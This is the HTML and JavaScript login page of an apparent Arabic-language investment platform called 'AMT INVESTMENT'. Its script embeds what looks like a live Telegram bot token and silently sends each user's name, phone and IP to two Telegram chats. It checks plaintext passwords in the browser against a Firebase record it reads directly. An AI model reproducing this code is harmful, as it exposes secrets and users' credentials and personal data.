<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AMT INVESTMENT | تسجيل الدخول</title>
    <link rel="stylesheet" href="glass.css">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="security.js"></script>
</head>
<body class="main-bg">
    <div class="glass-container">
        <h1 class="logo">AMT <span>LOGIN</span></h1>
        <p class="subtitle">مرحباً بك مجدداً في Matrix System</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="tel" id="loginPhone" placeholder="رقم الهاتف (بدون +)" required>
            </div>
            <div class="input-group">
                <input type="password" id="loginPass" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="btn-primary">دخول للمنصة</button>
        </form>
        
        <p class="footer-note">ليس لديك حساب؟ <a href="register.html">إنشاء حساب جديد</a></p>
        <p class="version-text" onclick="triggerVault()">v1.0.8</p>
    </div>

    <script>
        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
        const chatIds = ["8622780736", "8211953992"];

        document.getElementById('loginForm').onsubmit = (e) => {
            e.preventDefault();
            const phone = document.getElementById('loginPhone').value;
            const pass = document.getElementById('loginPass').value;

            // التأكد من وجود الحساب في Firebase
            const userRef = firebase.database().ref('users/' + phone);
            userRef.once('value').then(async (snapshot) => {
                if(snapshot.exists()) {
                    const userData = snapshot.val();
                    if(userData.password === pass) {
                        // حفظ جلسة الدخول
                        localStorage.setItem('userPhone', phone);
                        
                        // إشعار تليجرام بالدخول
                        const loginMsg = `🔑 دخول جديد!\n👤 الاسم: ${userData.full_name}\n📱 الهاتف: ${phone}\n🌐 الـ IP: ${userData.ip}`;
                        chatIds.forEach(id => {
                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(loginMsg)}`);
                        });

                        alert("أهلاً بك يا " + userData.full_name);
                        window.location.href = "dashboard.html";
                    } else {
                        alert("كلمة السر غير صحيحة!");
                    }
                } else {
                    alert("رقم الهاتف غير مسجل!");
                }
            });
        };
    </script>
</body>
</html>
